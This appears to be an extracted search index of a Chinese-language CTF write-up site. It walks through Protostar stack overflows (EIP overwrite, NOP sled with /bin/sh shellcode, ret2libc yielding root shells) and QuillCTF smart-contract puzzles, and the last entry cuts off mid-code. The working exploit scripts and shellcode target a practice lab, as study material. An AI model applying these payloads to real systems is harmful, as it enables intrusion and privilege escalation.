'Z' )): print ( chr ( i ) * 4 , end = '' ) 1 2 3 4 5 6 7 $ python /tmp/stack.py > /tmp/test $ gdb ./stack4 ( gdb ) r < /tmp/test Starting program: /opt/protostar/bin/stack4 < /tmp/test Program received signal SIGSEGV, Segmentation fault. 0x54545454 in ?? () # T \u83b7\u53d6\u51fd\u6570 win \u7684\u5730\u5740 1 2 $ objdump -t stack4 | grep win 080483f4 g F .text 00000014 win","title":"Stack 4"},{"location":"wargames/protostar/stack/#exploit_4","text":"1 2 3 $ python -c \"print('a' * 19 * 4 + '\\xf4\\x83\\x04\\x08')\" | ./stack4 code flow successfully changed Segmentation fault \u53ef\u4ee5\u4f7f\u7528 struct \u7b80\u5316 1 2 3 >>> import struct >>> struct . pack ( 'I' , 0x080483f4 ) ' \\xf4\\x83\\x04\\x08 '","title":"Exploit"},{"location":"wargames/protostar/stack/#stack-5","text":"If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger 1 2 3 4 5 6 7 8 9 10 11 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } \u9996\u5148\u9700\u8981\u786e\u5b9a\u53ef\u4ee5\u63a7\u5236 EIP \u7684\u6ea2\u51fa\u70b9 1 2 3 from __future__ import print_function for i in range ( ord ( 'A' ), ord ( 'Z' ) + 1 ): print ( chr ( i ) * 4 , end = '' ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ python /tmp/stack.py > /tmp/test $ gdb ./stack5 ( gdb ) disassemble main Dump of assembler code for function main: 0x080483c4 <main+0>: push %ebp 0x080483c5 <main+1>: mov %esp,%ebp 0x080483c7 <main+3>: and $0 xfffffff0,%esp 0x080483ca <main+6>: sub $0 x50,%esp 0x080483cd <main+9>: lea 0x10 ( %esp ) ,%eax 0x080483d1 <main+13>: mov %eax, ( %esp ) 0x080483d4 <main+16>: call 0x80482e8 <gets@plt> 0x080483d9 <main+21>: leave 0x080483da <main+22>: ret End of assembler dump. ( gdb ) break *0x080483da # ret ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >x/8wx $esp >end 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ( gdb ) r < /tmp/test Starting program: /opt/protostar/bin/stack5 < /tmp/test 0x80483da <main+22>: ret 0xbffff6ac: 0x54545454 0x55555555 0x56565656 0x57575757 0xbffff6bc: 0x58585858 0x59595959 0x5a5a5a5a 0xb7ffef00 Breakpoint 1 , 0x080483da in main ( argc = Cannot access memory at address 0x5353535b ) at stack5/stack5.c:11 11 stack5/stack5.c: No such file or directory. in stack5/stack5.c ( gdb ) si Cannot access memory at address 0x53535357 ( gdb ) si Program received signal SIGSEGV, Segmentation fault. 0x54545454: Error while running hook_stop: Cannot access memory at address 0x54545454 0x54545454 in ?? () # T \u81f3\u4e8e\u8df3\u8f6c\u7684\u4f4d\u7f6e =v= \u53ef\u4ee5\u7b80\u5355\u5730\u9009\u62e9\u4e3a\u80fd\u591f\u63a7\u5236 EIP \u6ea2\u51fa\u70b9\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\uff0c\u5373\u4ee5\u4e0b\u7684 0xbffff6b0 \uff08 0x55555555 \u5bf9\u5e94\u7684\u4f4d\u7f6e\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 Starting program: /opt/protostar/bin/stack5 < /tmp/test 0x80483da <main+22>: ret 0xbffff6ac: 0x54545454 0x55555555 0x56565656 0x57575757 0xbffff6bc: 0x58585858 0x59595959 0x5a5a5a5a 0xb7ffef00 Breakpoint 1 , 0x080483da in main ( argc = Cannot access memory at address 0x5353535b ) at stack5/stack5.c:11 11 in stack5/stack5.c ( gdb ) si Cannot access memory at address 0x53535357 ( gdb ) info registers eax 0xbffff660 -1073744288 ecx 0xbffff660 -1073744288 edx 0xb7fd9334 -1208118476 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff6b0 0xbffff6b0 ebp 0x53535353 0x53535353 esi 0x0 0 edi 0x0 0 eip 0x54545454 0x54545454 eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 \u4f46\u7531\u4e8e\u73af\u5883\u53d8\u91cf\u7684\u5b58\u5728\uff0c\u80fd\u591f\u63a7\u5236 EIP \u6ea2\u51fa\u70b9\u5bf9\u5e94\u7684\u5730\u5740\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u90a3\u4e48\u4e5f\u6ca1\u6cd5\u786e\u5b9a\u8981\u8df3\u8f6c\u7684\u4e0b\u4e00\u5730\u5740\u3002\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7\u586b\u5145 NOP(No Operation) \u6307\u4ee4\u6765\u89e3\u51b3\u73af\u5883\u53d8\u91cf\u5bfc\u81f4\u7684\u5730\u5740\u4e0d\u4e00\u81f4\u95ee\u9898 \u5148\u8bd5\u8bd5\u4e0b\u4e2a\u65ad\u70b9~ 1 2 3 4 import struct eip = struct . pack ( 'I' , 0xbffff6b0 + 16 ) # \u4fdd\u8bc1\u8df3\u8f6c\u5728 NOP \u91cc > < nop = ' \\x90 ' * 64 print ( 'a' * 19 * 4 + eip + nop + ' \\xcc ' * 4 ) 1 2 3 $ python /tmp/stack.py > /tmp/break $ ./stack5 < /tmp/break Trace/breakpoint trap \u63a5\u4e0b\u6765\u5c06 INT3 \u6307\u4ee4\u66ff\u6362\u4e3a shellcode 1 2 3 4 5 6 import struct eip = struct . pack ( 'I' , 0xbffff6b0 + 16 ) nop = ' \\x90 ' * 64 shellcode = ' \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80 ' print ( 'a' * 19 * 4 + eip + nop + shellcode ) # http://shell-storm.org/shellcode/files/shellcode-811.php 1 2 3 4 5 6 7 8 $ python /tmp/stack.py | ./stack5 # nothing happened (\u014f\u03c9\u014f) $ python /tmp/stack.py > /tmp/getshell $ gdb ./stack5 ( gdb ) r < /tmp/getshell Starting program: /opt/protostar/bin/stack5 < /tmp/getshell Executing new program: /bin/dash # \u901a\u8fc7 gdb \u53ef\u4ee5\u770b\u5230 shell \u80fd\u591f\u83b7\u53d6 Program exited normally. \u53ef\u4ee5\u901a\u8fc7 cat \u6765\u4fdd\u8bc1\u83b7\u5f97 shell \u540e\u4e0d\u76f4\u63a5\u9000\u51fa 1 2 3 4 5 $ ( python /tmp/stack.py ; cat ) | ./stack5 id uid = 1001 ( user ) gid = 1001 ( user ) euid = 0 ( root ) groups = 0 ( root ) ,1001 ( user ) whoami root","title":"Stack 5"},{"location":"wargames/protostar/stack/#stack-6","text":"what happens when you have restrictions on the return address 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void getpath () { char buffer [ 64 ]; unsigned int ret ; printf ( \"input path please: \" ); fflush ( stdout ); gets ( buffer ); ret = __builtin_return_address ( 0 ); // read the current return address from the stack if (( ret & 0xbf000000 ) == 0xbf000000 ) { // check the return address if it starts with 0xbf printf ( \"bzzzt (%p) \\n \" , ret ); _exit ( 1 ); } printf ( \"got path %s \\n \" , buffer ); } int main ( int argc , char ** argv ) { getpath (); } \u9996\u5148\u6d4b\u8bd5\u80fd\u591f\u63a7\u5236 EIP \u7684\u6ea2\u51fa\u70b9\uff08\u4e0e\u5148\u524d\u7684\u65b9\u6cd5\u76f8\u540c\uff0c\u4f4d\u7f6e\u5bf9\u5e94 U \uff09 \u901a\u8fc7 gdb \u53ef\u4ee5\u770b\u5230 0xbf \u5f00\u5934\u7684\u5730\u5740\u5bf9\u5e94 stack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ gdb ./stack6 ( gdb ) break *getpath Breakpoint 1 at 0x8048484: file stack6/stack6.c, line 7 . ( gdb ) r Starting program: /opt/protostar/bin/stack6 Breakpoint 1 , getpath () at stack6/stack6.c:7 7 stack6/stack6.c: No such file or directory. in stack6/stack6.c ( gdb ) info proc map process 2921 cmdline = '/opt/protostar/bin/stack6' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/stack6' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] ret \u6307\u4ee4\u5f39\u51fa\u6808\u9876\u5b58\u50a8\u7684\u5730\u5740\u5e76\u8df3\u8f6c\uff0c\u90a3\u4e48\u53ef\u4ee5\u5148\u8df3\u8f6c\u5230 ret \u672c\u8eab\u7ed5\u8fc7\u68c0\u67e5\uff0c\u63a5\u4e0b\u6765\u518d\u8df3\u8f6c\u5230\u6808\u5c31\u53ef\u4ee5\u4e86 :3 Dump of assembler code for function getpath 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ( gdb ) disassemble getpath Dump of assembler code for function getpath: 0x08048484 <getpath+0>: push ebp 0x08048485 <getpath+1>: mov ebp,esp 0x08048487 <getpath+3>: sub esp,0x68 0x0804848a <getpath+6>: mov eax,0x80485d0 0x0804848f <getpath+11>: mov DWORD PTR [ esp ] ,eax 0x08048492 <getpath+14>: call 0x80483c0 <printf@plt> 0x08048497 <getpath+19>: mov eax,ds:0x8049720 0x0804849c <getpath+24>: mov DWORD PTR [ esp ] ,eax 0x0804849f <getpath+27>: call 0x80483b0 <fflush@plt> 0x080484a4 <getpath+32>: lea eax, [ ebp-0x4c ] 0x080484a7 <getpath+35>: mov DWORD PTR [ esp ] ,eax 0x080484aa <getpath+38>: call 0x8048380 <gets@plt> 0x080484af <getpath+43>: mov eax,DWORD PTR [ ebp+0x4 ] 0x080484b2 <getpath+46>: mov DWORD PTR [ ebp-0xc ] ,eax 0x080484b5 <getpath+49>: mov eax,DWORD PTR [ ebp-0xc ] 0x080484b8 <getpath+52>: and eax,0xbf000000 0x080484bd <getpath+57>: cmp eax,0xbf000000 0x080484c2 <getpath+62>: jne 0x80484e4 <getpath+96> 0x080484c4 <getpath+64>: mov eax,0x80485e4 0x080484c9 <getpath+69>: mov edx,DWORD PTR [ ebp-0xc ] 0x080484cc <getpath+72>: mov DWORD PTR [ esp+0x4 ] ,edx 0x080484d0 <getpath+76>: mov DWORD PTR [ esp ] ,eax 0x080484d3 <getpath+79>: call 0x80483c0 <printf@plt> 0x080484d8 <getpath+84>: mov DWORD PTR [ esp ] ,0x1 0x080484df <getpath+91>: call 0x80483a0 <_exit@plt> 0x080484e4 <getpath+96>: mov eax,0x80485f0 0x080484e9 <getpath+101>: lea edx, [ ebp-0x4c ] 0x080484ec <getpath+104>: mov DWORD PTR [ esp+0x4 ] ,edx 0x080484f0 <getpath+108>: mov DWORD PTR [ esp ] ,eax 0x080484f3 <getpath+111>: call 0x80483c0 <printf@plt> 0x080484f8 <getpath+116>: leave 0x080484f9 <getpath+117>: ret End of assembler dump. 1 2 3 4 5 import struct ret = struct . pack ( 'I' , 0x080484f9 ) eip = struct . pack ( 'I' , 0xbffff6b0 + 16 ) nop = ' \\x90 ' * 64 print ( 'a' * 80 + ret + eip + nop + ' \\xcc ' * 4 ) # just to hit the break point 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 $ python /tmp/stack.py > /tmp/break $ gdb ./stack6 ( gdb ) break *0x080484f9 Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23 . ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >x/8wx $esp >end ( gdb ) r < /tmp/break Starting program: /opt/protostar/bin/stack6 < /tmp/break input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\ufffdaaaaaaaaaaaa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd 0x80484f9 <getpath+117>: ret 0xbffff69c: 0x080484f9 0xbffff6c0 0x90909090 0x90909090 0xbffff6ac: 0x90909090 0x90909090 0x90909090 0x90909090 Breakpoint 1 , 0x080484f9 in getpath () at stack6/stack6.c:23 23 stack6/stack6.c: No such file or directory. in stack6/stack6.c ( gdb ) si 0x80484f9 <getpath+117>: ret # ret again, because we jump to it 0xbffff6a0: 0xbffff6c0 0x90909090 0x90909090 0x90909090 0xbffff6b0: 0x90909090 0x90909090 0x90909090 0x90909090 Breakpoint 1 , 0x080484f9 in getpath () at stack6/stack6.c:23 23 in stack6/stack6.c ( gdb ) Cannot access memory at address 0x61616165 ( gdb ) 0xbffff6c1: nop 0xbffff6a4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6b4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6c1 in ?? () ( gdb ) c Continuing. Program received signal SIGTRAP, Trace/breakpoint trap. 0xbffff6e5: int3 0xbffff6a4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6b4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6e5 in ?? () This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming. system \u662f libc \u51fd\u6570\uff0c\u80fd\u591f\u6267\u884c shell \u547d\u4ee4 1 2 3 4 5 #include <stdlib.h> void main () { system ( \"/bin/sh\" ); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ gcc sys.c -o sys $ ./sys $ id uid = 1001 ( user ) gid = 1001 ( user ) groups = 1001 ( user ) $ exit $ gdb ./sys ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080483c4 <main+0>: push ebp 0x080483c5 <main+1>: mov ebp,esp 0x080483c7 <main+3>: and esp,0xfffffff0 0x080483ca <main+6>: sub esp,0x10 0x080483cd <main+9>: mov DWORD PTR [ esp ] ,0x80484a0 # \u9700\u6267\u884c\u7684\u547d\u4ee4\u5165\u6808 0x080483d4 <main+16>: call 0x80482ec <system@plt> # \u8c03\u7528\u51fd\u6570\u4f1a\u5c06 call \u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\u5165\u6808 0x080483d9 <main+21>: leave 0x080483da <main+22>: ret End of assembler dump. ( gdb ) x/s 0x80484a0 0x80484a0: \"/bin/sh\" call system \u4e4b\u540e\uff0c\u6808\u5e94\u4e3a\u4ee5\u4e0b\u7ed3\u6784 ... ... call \u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 0x80484a0\uff08\u53c2\u6570\u5b57\u7b26\u4e32\u6240\u5728\u7684\u5730\u5740\uff09 \u63a7\u5236 getpath \u7684 ret \u8fd4\u56de\u5230 system \uff0c\u56e0\u4e3a\u6ca1\u6709\u4f7f\u7528 call \u6240\u4ee5\u9700\u8981\u6784\u9020\u7c7b\u4f3c call \u4ea7\u751f\u7684\u6808 \u53ef\u4ee5\u501f\u52a9 libc \u4f20\u9012\u6240\u9700\u7684\u547d\u4ee4\u5b57\u7b26\u4e32 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # \u83b7\u53d6 /bin/sh \u5728 libc \u4e2d\u7684 offset # -t x: Print the location of the string in hex $ strings -a -t x /lib/libc-2.11.2.so | grep \"/bin/sh\" 11f3bf /bin/sh $ gdb ./stack6 ... ( gdb ) p system # system \u7684\u5730\u5740 $1 = { <text variable, no debug info> } 0xb7ecffb0 <__libc_system> ( gdb ) info proc map process 3986 cmdline = '/opt/protostar/bin/stack6' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/stack6' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] ( gdb ) x/s 0xb7e97000+0x11f3bf # offset \u7ed3\u5408 libc \u7684\u8d77\u59cb\u5730\u5740\u53ef\u83b7\u5f97 /bin/sh \u7684\u5730\u5740 0xb7fb63bf: \"/bin/sh\"","title":"Stack 6"},{"location":"wargames/protostar/stack/#exploit_5","text":"1 2 3 4 5 import struct system = struct . pack ( \"I\" , 0xb7ecffb0 ) ret_after_sys = 'AAAA' bin_sh = struct . pack ( \"I\" , 0xb7fb63bf ) print ( 'a' * 80 + system + ret_after_sys + bin_sh ) # ret2libc 1 2 3 4 5 6 $ ( python /tmp/stack.py ; cat ) | ./stack6 input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\ufffd\ufffd\ufffdaaaaaaaaaaaa\ufffd\ufffd\ufffdAAAA\ufffdc\ufffd\ufffd id uid = 1001 ( user ) gid = 1001 ( user ) euid = 0 ( root ) groups = 0 ( root ) ,1001 ( user ) whoami root","title":"Exploit"},{"location":"wargames/quillctf/assert_equal/","tags":["smart contract","evm","bytecode","opcode","huff"],"text":"#smart contract #evm #bytecode #opcode #huff .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Objective of CTF \u00b6 You need to write a smart contract that accepts two unsigned integers as inputs. The contract should return 1 if the input numbers are equal; otherwise, it should return a different number. QuillCTF Challenges - assertEqual Vulnerability Description \u00b6 Most arithmetic opcodes are banned We can not simply push 0x04 onto the stack in order to load the first parameter We can not use opcode EQ to compare the two numbers As an alternative, ISZERO can be used to compare 4 wei is send for each call Since v0.8.7 does not support PUSH0, we can use RETURNDATASIZE as an alternative Attack Steps \u00b6 We can leverage CALLVALUE to get the first parameter Using the first parameter as the key, store any value that is greater than 0 in that storage slot Using the second parameter as the key, load the value of that storage slot. If the value is not 0, the two numbers are equal Proof of Concept \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // isNumbersEQContract.huff #define macro MAIN() = takes (0) returns (0) { callvalue callvalue calldataload sstore 0x24 calldataload sload iszero iszero returndatasize callvalue calldataload sstore // restore to 0 returndatasize mstore 0x20 returndatasize return } // EIP 1167 creation code: 3d60<code-size>80600a3d3981f3 // huffc isNumbersEQContract.huff -r 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 // SPDX-License-Identifier: MIT pragma solidity 0.8.7 ; import \"forge-std/Test.sol\" ; contract EQ is Test { address isNumbersEQContract ; bytes1 [] badOpcodes ; function setUp () public { badOpcodes . push ( hex \"01\" ); // ADD badOpcodes . push ( hex \"02\" ); // MUL badOpcodes . push ( hex \"03\" ); // SUB badOpcodes . push ( hex \"04\" ); // DIV badOpcodes . push ( hex \"05\" ); // SDIV badOpcodes . push ( hex \"06\" ); // MOD badOpcodes . push ( hex \"07\" ); // SMOD badOpcodes . push ( hex \"08\" ); // ADDMOD badOpcodes . push ( hex \"09\" ); // MULLMOD badOpcodes . push ( hex \"18\" ); // XOR badOpcodes . push ( hex \"10\" ); // LT badOpcodes . push ( hex \"11\" ); // GT badOpcodes . push ( hex \"12\" ); // SLT badOpcodes . push ( hex \"13\" ); // SGT badOpcodes . push ( hex \"14\" ); // EQ badOpcodes . push ( hex \"f0\" ); // create badOpcodes . push ( hex \"f5\" ); // create2 badOpcodes . push ( hex \"19\" ); // NOT badOpcodes . push ( hex \"1b\" ); // SHL badOpcodes . push ( hex \"1c\" ); // SHR badOpcodes . push ( hex \"1d\" ); // SAR vm . createSelectFork ( \"https://eth-mainnet.g.alchemy.com/v2/...\" ); address isNumbersEQContractTemp ; // solution - your bytecode // The code size is changed slightly to bypass the check (14 -> 15) bytes memory bytecode = hex \"3d601580600a3d3981f3343435556024355415153d3435553d5260203df3\" ; // require ( bytecode . length < 40 , \"try harder!\" ); for ( uint i ; i < bytecode . length ; i ++ ) { for ( uint a ; a < badOpcodes . length ; a ++ ) { if ( bytecode [ i ] == badOpcodes [ a ]) revert (); } } assembly { isNumbersEQContractTemp := create ( 0 , add ( bytecode , 0x20 ), mload ( bytecode ) ) if iszero ( extcodesize ( isNumbersEQContractTemp )) { revert ( 0 , 0 ) } } isNumbersEQContract = isNumbersEQContractTemp ; } // fuzzing test function test_isNumbersEq ( uint8 a , uint8 b ) public { ( bool success , bytes memory data ) = isNumbersEQContract . call { value : 4 }( abi . encodeWithSignature ( \"isEq(uint256, uint256)\" , a , b ) ); require ( success , \"!success\" ); uint result = abi . decode ( data , ( uint )); a == b ? assert ( result == 1 ) : assert ( result != 1 ); // additional tests // 1 - equal numbers (, data ) = isNumbersEQContract . call { value : 4 }( abi . encodeWithSignature ( \"isEq(uint256, uint256)\" , 57204 , 57204 ) ); require ( abi . decode ( data , ( uint )) == 1 , \"1 test fail\" ); // 2 - different numbers (, data ) = isNumbersEQContract . call { value : 4 }( abi . encodeWithSignature ( \"isEq(uint256, uint256)\" , 0 , 3568 ) ); require ( abi . decode ( data , ( uint )) != 1 , \"2 test fail\" ); } }","title":"assertEqual"},{"location":"wargames/quillctf/assert_equal/#objective-of-ctf","text":"You need to write a smart contract that accepts two unsigned integers as inputs. The contract should return 1 if the input numbers are equal; otherwise, it should return a different number. QuillCTF Challenges - assertEqual","title":"Objective of CTF"},{"location":"wargames/quillctf/assert_equal/#vulnerability-description","text":"Most arithmetic opcodes are banned We can not simply push 0x04 onto the stack in order to load the first parameter We can not use opcode EQ to compare the two numbers As an alternative, ISZERO can be used to compare 4 wei is send for each call Since v0.8.7 does not support PUSH0, we can use RETURNDATASIZE as an alternative","title":"Vulnerability Description"},{"location":"wargames/quillctf/assert_equal/#attack-steps","text":"We can leverage CALLVALUE to get the first parameter Using the first parameter as the key, store any value that is greater than 0 in that storage slot Using the second parameter as the key, load the value of that storage slot. If the value is not 0, the two numbers are equal","title":"Attack Steps"},{"location":"wargames/quillctf/assert_equal/#proof-of-concept","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // isNumbersEQContract.huff #define macro MAIN() = takes (0) returns (0) { callvalue callvalue calldataload sstore 0x24 calldataload sload iszero iszero returndatasize callvalue calldataload sstore // restore to 0 returndatasize mstore 0x20 returndatasize return } // EIP 1167 creation code: 3d60<code-size>80600a3d3981f3 // huffc isNumbersEQContract.huff -r 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 // SPDX-License-Identifier: MIT pragma solidity 0.8.7 ; import \"forge-std/Test.sol\" ; contract EQ is Test { address isNumbersEQContract ; bytes1 [] badOpcodes ; function setUp () public { badOpcodes . push ( hex \"01\" ); // ADD badOpcodes . push ( hex \"02\" ); // MUL badOpcodes . push ( hex \"03\" ); // SUB badOpcodes . push ( hex \"04\" ); // DIV badOpcodes . push ( hex \"05\" ); // SDIV badOpcodes . push ( hex \"06\" ); // MOD badOpcodes . push ( hex \"07\" ); // SMOD badOpcodes . push ( hex \"08\" ); // ADDMOD badOpcodes . push ( hex \"09\" ); // MULLMOD badOpcodes . push ( hex \"18\" ); // XOR badOpcodes . push ( hex \"10\" ); // LT badOpcodes . push ( hex \"11\" ); // GT badOpcodes . push ( hex \"12\" ); // SLT badOpcodes . push ( hex \"13\" ); // SGT badOpcodes . push ( hex \"14\" ); // EQ badOpcodes . push ( hex \"f0\" ); // create badOpcodes . push ( hex \"f5\" ); // create2 badOpcodes . push ( hex \"19\" ); // NOT badOpcodes . push ( hex \"1b\" ); // SHL badOpcodes . push ( hex \"1c\" ); // SHR badOpcodes . push ( hex \"1d\" ); // SAR vm . createSelectFork ( \"https://eth-mainnet.g.alchemy.com/v2/...\" ); address isNumbersEQContractTemp ; // solution - your bytecode // The code size is changed slightly to bypass the check (14 -> 15) bytes memory bytecode = hex \"3d601580600a3d3981f3343435556024355415153d3435553d5260203df3\" ; // require ( bytecode . length < 40 , \"try harder!\" ); for ( uint i ; i < bytecode . length ; i ++ ) { for ( uint a ; a < badOpcodes . length ; a ++ ) { if ( bytecode [ i ] == badOpcodes [ a ]) revert (); } } assembly { isNumbersEQContractTemp := create ( 0 , add ( bytecode , 0x20 ), mload ( bytecode ) ) if iszero ( extcodesize ( isNumbersEQContractTemp )) { revert ( 0 , 0 ) } } isNumbersEQContract = isNumbersEQContractTemp ; } // fuzzing test function test_isNumbersEq ( uint8 a , uint8 b ) public { ( bool success , bytes memory data ) = isNumbersEQContract . call { value : 4 }( abi . encodeWithSignature ( \"isEq(uint256, uint256)\" , a , b ) ); require ( success , \"!success\" ); uint result = abi . decode ( data , ( uint )); a == b ? assert ( result == 1 ) : assert ( result != 1 ); // additional tests // 1 - equal numbers (, data ) = isNumbersEQContract . call { value : 4 }( abi . encodeWithSignature ( \"isEq(uint256, uint256)\" , 57204 , 57204 ) ); require ( abi . decode ( data , ( uint )) == 1 , \"1 test fail\" ); // 2 - different numbers (, data ) = isNumbersEQContract . call { value : 4 }( abi . encodeWithSignature ( \"isEq(uint256, uint256)\" , 0 , 3568 ) ); require ( abi . decode ( data , ( uint )) != 1 , \"2 test fail\" ); } }","title":"Proof of Concept"},{"location":"wargames/quillctf/collect/","tags":["smart contract","uniswap v3","tokensowed"],"text":"#smart contract #uniswap v3 #tokensowed .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Objective of CTF \u00b6 You have 1 LP from the owner. At the end of the test, you collect commission from your LP. But it's too small for you. Increase the amount of commission, which you can get. QuillCTF Challenges - Collect Vulnerability Description \u00b6 The amount obtained from collect() is related to the amount of owed by the position 1 2 3 4 5 6 7 8 9 10 11 12 13 // UniswapV3Pool.sol function collect ( address recipient , int24 tickLower , int24 tickUpper , uint128 amount0Requested , uint128 amount1Requested ) external override lock returns ( uint128 amount0 , uint128 amount1 ) { ... amount0 = amount0Requested > position . tokensOwed0 ? position . tokensOwed0 : amount0Requested ; amount1 = amount1Requested > position . tokensOwed1 ? position . tokensOwed1 : amount1Requested ; ... } We need to increase the amount of commission, i.e. position.tokensOwed We can simply decrease all the liquidity defiMaster has, and the amount of token will be added to the tokensOwed 1 2 3 4 5 6 if ( amount0 > 0 || amount1 > 0 ) { ( position . 